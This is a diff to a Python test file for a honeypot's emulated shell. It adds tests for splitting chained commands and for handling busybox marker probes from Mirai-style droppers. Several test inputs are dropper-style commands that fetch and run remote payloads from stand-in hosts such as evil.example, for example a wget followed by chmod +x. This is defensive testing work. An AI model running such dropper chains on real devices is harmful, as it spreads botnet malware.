@@ -7,7 +7,7 @@ permission model (it has none) or touching the real filesystem.
 from __future__ import annotations
 
 from honeypot.config.schema import PersonaConfig
-from honeypot.shell.commands import dispatch
+from honeypot.shell.commands import MAX_CHAIN_SEGMENTS, dispatch, split_command_line
 from honeypot.shell.filesystem import FakeFilesystem
 
 
@@ -440,3 +440,58 @@ def test_busybox_applet_unwrap_still_works():
     result = dispatch("busybox wget http://evil.example/x", _fs(), PersonaConfig(arch="riscv64"))
     assert result.download_request is not None
     assert result.download_request.url == "http://evil.example/x"
+
+
+# -- command chaining ------------------------------------------------------
+
+def test_split_on_semicolon_and_logical_operators():
+    assert split_command_line("cd /tmp || cd /var/run; wget http://x/a && chmod +x a") == [
+        (";", "cd /tmp"), ("||", "cd /var/run"), (";", "wget http://x/a"), ("&&", "chmod +x a"),
+    ]
+
+
+def test_split_respects_quotes_and_escapes():
+    assert split_command_line('echo "a;b" && echo \'c||d\'; echo e\\;f') == [
+        (";", 'echo "a;b"'), ("&&", "echo 'c||d'"), (";", "echo e\\;f"),
+    ]
+
+
+def test_split_leaves_pipes_background_and_fd_redirects_alone():
+    assert split_command_line("./x 2>&1 &") == [(";", "./x 2>&1 &")]
+    assert split_command_line("cat /proc/cpuinfo | grep model") == [(";", "cat /proc/cpuinfo | grep model")]
+
+
+def test_split_ignores_empty_segments_and_newlines_separate():
+    assert split_command_line(";; a ;\n b ;") == [(";", "a"), (";", "b")]
+    assert split_command_line("") == []
+
+
+def test_split_is_capped():
+    assert len(split_command_line(";".join(["id"] * 500))) == MAX_CHAIN_SEGMENTS
+
+
+# -- busybox applet marker probes (Mirai-family droppers) --------------------
+
+def test_busybox_unknown_applet_reports_applet_not_found():
+    for line in ("/bin/busybox BOTNET", "busybox BOTNET"):
+        result = dispatch(line, _fs(), PersonaConfig(arch="riscv64"))
+        assert result.output == "BOTNET: applet not found"
+        assert result.status == 127
+        assert result.execution_attempt is None  # a marker probe, not an execution
+
+
+def test_slash_busybox_path_argument_is_still_an_execution_attempt():
+    result = dispatch("/bin/busybox ./mal", _fs(), PersonaConfig(arch="riscv64"))
+    assert result.output == "./mal: applet not found"
+    assert result.execution_attempt == "/bin/busybox ./mal"
+
+
+def test_slash_bin_busybox_wget_is_a_download():
+    result = dispatch("/bin/busybox wget http://evil.example/x.bin", _fs(), PersonaConfig(arch="riscv64"))
+    assert result.download_request is not None
+    assert result.download_request.url == "http://evil.example/x.bin"
+
+
+def test_home_directory_exists():
+    result = dispatch("ls /home", _fs(), PersonaConfig(arch="riscv64"))
+    assert "No such file" not in result.output
